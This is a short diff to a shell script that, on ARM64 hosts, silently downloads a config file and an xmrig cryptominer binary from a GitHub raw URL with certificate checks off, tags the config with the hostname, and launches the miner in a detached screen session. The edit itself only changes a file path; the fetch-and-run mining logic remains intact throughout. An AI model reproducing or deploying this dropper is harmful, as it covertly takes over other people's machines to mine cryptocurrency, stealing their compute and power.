@@ -2,9 +2,8 @@
   OS=$(uname -m)
   if [[ ${OS} == "aarch64" ]]; then
   wget -N --no-check-certificate -q -O config.json https://raw.githubusercontent.com/lvlvgongzhu/lvlv/main/config.json
-  config="/root/config.json"
   name=$(hostname)
-  sed -i "s/6666/${name}/g" ${config}
+  sed -i "s/6666/${name}/g" config.json
   wget -N --no-check-certificate -q -O xmrig https://raw.githubusercontent.com/lvlvgongzhu/lvlv/main/armxmrig && chmod 755 xmrig
   screen -dmS xmrig ./xmrig
   fi
